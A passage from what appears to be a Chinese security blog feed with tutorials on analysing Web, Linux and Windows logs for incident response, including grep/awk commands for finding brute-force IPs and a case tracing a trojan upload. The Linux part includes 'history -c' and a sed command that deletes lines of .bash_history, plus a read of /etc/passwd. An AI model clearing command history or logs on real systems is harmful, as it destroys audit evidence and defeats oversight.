    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第3篇-Web日志分析"><a href="#第3篇-Web日志分析" class="headerlink" title="第3篇:Web日志分析"></a>第3篇:Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] "GET /login.html HTTP/1.1" 200 786 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><pre class="line-numbers language-none"><code class="language-none">1、列出当天访问次数最多的IP命令：cut -d- -f 1 log_file|uniq -c | sort -rn | head -202、查看当天有多少个IP访问：awk '{print $1}' log_file|sort|uniq|wc -l3、查看某一个页面被访问的次数：grep "/index.php" log_file | wc -l4、查看每一个IP访问了多少个页面：awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file5、将每个IP访问的页面数进行从小到大排序：awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n6、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file| awk '{print $1,$7}'7、去掉搜索引擎统计当天的页面：awk '{print $12,$1}' log_file | grep ^\"Mozilla | awk '{print $2}' |sort | uniq | wc -l8、查看2018年6月21日14时这一个小时内有多少IP访问:awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-3-1.png"></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-3-2.png"></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><pre class="line-numbers language-none"><code class="language-none">A、攻击者访问首页和登录页B、攻击者访问MsgSjlb.aspx和MsgSebd.aspxC、攻击者访问Xzuser.aspxD、攻击者多次POST（怀疑通过这个页面上传模块缺陷）E、攻击者访问了图片木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token operator">-</span><span class="token constant">E</span> <span class="token string">'Googlebot|Baiduspider'</span>  <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{ print $1 }'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计浏览器：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> grep <span class="token operator">-</span>v <span class="token operator">-</span><span class="token constant">E</span> <span class="token string">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>r <span class="token operator">-</span>n <span class="token operator">|</span> head <span class="token operator">-</span>n <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IP 统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token string">'23/May/2019'</span> <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1}'</span> <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span><span class="token string">'.'</span> <span class="token string">'{print $1"."$2"."$3"."$4}'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>r <span class="token operator">-</span>n <span class="token operator">|</span> head <span class="token operator">-</span>n <span class="token number">10</span>   <span class="token number">2206</span> <span class="token number">219.136</span><span class="token number">.134</span><span class="token number">.13</span>   <span class="token number">1497</span> <span class="token number">182.34</span><span class="token number">.15</span><span class="token number">.248</span>   <span class="token number">1431</span> <span class="token number">211.140</span><span class="token number">.143</span><span class="token number">.100</span>   <span class="token number">1431</span> <span class="token number">119.145</span><span class="token number">.149</span><span class="token number">.106</span>   <span class="token number">1427</span> <span class="token number">61.183</span><span class="token number">.15</span><span class="token number">.179</span>   <span class="token number">1427</span> <span class="token number">218.6</span><span class="token number">.8</span><span class="token number">.189</span>   <span class="token number">1422</span> <span class="token number">124.232</span><span class="token number">.150</span><span class="token number">.171</span>   <span class="token number">1421</span> <span class="token number">106.187</span><span class="token number">.47</span><span class="token number">.224</span>   <span class="token number">1420</span> <span class="token number">61.160</span><span class="token number">.220</span><span class="token number">.252</span>   <span class="token number">1418</span> <span class="token number">114.80</span><span class="token number">.201</span><span class="token number">.18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>统计网段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1}'</span> <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span><span class="token string">'.'</span> <span class="token string">'{print $1"."$2"."$3".0"}'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>r <span class="token operator">-</span>n <span class="token operator">|</span> head <span class="token operator">-</span>n <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计域名：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat  <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{print $2}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HTTP Status：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat  <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{print $9}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span class="token number">5056585</span> <span class="token number">304</span><span class="token number">1125579</span> <span class="token number">200</span>   <span class="token number">7602</span> <span class="token number">400</span>      <span class="token number">5</span> <span class="token number">301</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>URL 统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat  <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{print $7}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件流量统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span><span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>moregrep <span class="token string">' 200 '</span> <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span><span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>URL访问量统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $7}'</span> <span class="token operator">|</span> egrep <span class="token string">'\?|&amp;'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>rn <span class="token operator">|</span> more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token operator">-</span>v <span class="token number">0</span>$ <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">'\" '</span> <span class="token string">'{print $4" " $1}'</span> web<span class="token punctuation">.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1" "$8}'</span> <span class="token operator">|</span> sort <span class="token operator">-</span>n <span class="token operator">-</span>k <span class="token number">1</span> <span class="token operator">-</span>r <span class="token operator">|</span> uniq <span class="token operator">&gt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>slow_url<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IP, URL 抽取：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># tail <span class="token operator">-</span>f <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> grep <span class="token string">'/test.html'</span> <span class="token operator">|</span> awk <span class="token string">'{print $1" "$7}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第2篇：Linux日志分析</title>
    <link href="http://www.xiaocaibi.top/posts/5abdae1b.html"/>
    <id>http://www.xiaocaibi.top/posts/5abdae1b.html</id>
    <published>2021-07-23T01:25:30.000Z</published>
    <updated>2021-09-20T08:47:43.838Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第2篇-Linux日志分析"><a href="#第2篇-Linux日志分析" class="headerlink" title="第2篇:Linux日志分析"></a>第2篇:Linux日志分析</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p><p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>小技巧：</p><p>1、grep显示前后几行信息:</p><pre class="line-numbers language-none"><code class="language-none">​标准unix/linux下的grep通过下面參数控制上下文：​grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行​grep -B 5 foo file 显示foo及前5行​grep -A 5 foo file 显示foo及后5行​查看grep版本号的方法是​grep -V<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、grep 查找含有某字符串的所有文件</p><pre class="line-numbers language-none"><code class="language-none">grep -rn "hello,world!" * : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、如何显示一个文件的某几行：</p><pre class="line-numbers language-none"><code class="language-none">cat input_file | tail -n +1000 | head -n 2000#从第1000行开始，显示2000行。即显示1000~2999行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、find /etc -name init </p><pre><code>//在目录/etc中查找文件init</code></pre><p>5、只是显示/etc/passwd的账户</p><pre><code>`cat /etc/passwd |awk  -F ':'  '{print $1}'`  //awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。</code></pre><p>6、sed -i ‘153,$d’ .bash_history</p><pre><code>删除历史操作记录，只保留前153行</code></pre><h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p><pre class="line-numbers language-none"><code class="language-none">1、定位有多少IP在爆破主机的root帐号：    grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些IP在爆破：grep "Failed password" /var/log/secure|grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"|uniq -c爆破用户名字典是什么？ grep "Failed password" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more登录成功的日期、用户名、IP：grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep "useradd" /var/log/secure 4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'# grep "userdel" /var/log/secure5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行:sudo -lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、/var/log/yum.log</strong></p><p>软件安装升级卸载日志：</p><pre class="line-numbers language-yum" data-language="yum"><div class="caption"><span>install gcc</span></div><code class="language-yum">yum install gcc[root@bogon ~]# more /var/log/yum.logJul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第1篇：Windows日志分析</title>
    <link href="http://www.xiaocaibi.top/posts/3bc54467.html"/>
    <id>http://www.xiaocaibi.top/posts/3bc54467.html</id>
    <published>2021-07-22T01:25:11.000Z</published>
    <updated>2021-09-20T08:47:43.807Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第1篇-Windows日志分析"><a href="#第1篇-Windows日志分析" class="headerlink" title="第1篇:Windows日志分析"></a>第1篇:Windows日志分析</h2><h3 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><pre class="line-numbers language-none"><code class="language-none">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>应用程序日志</strong></p><pre class="line-numbers language-none"><code class="language-none">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>安全日志</strong></p><pre class="line-numbers language-none"><code class="language-none">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-1.png"></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-2.png"></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-1-3.png"></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a 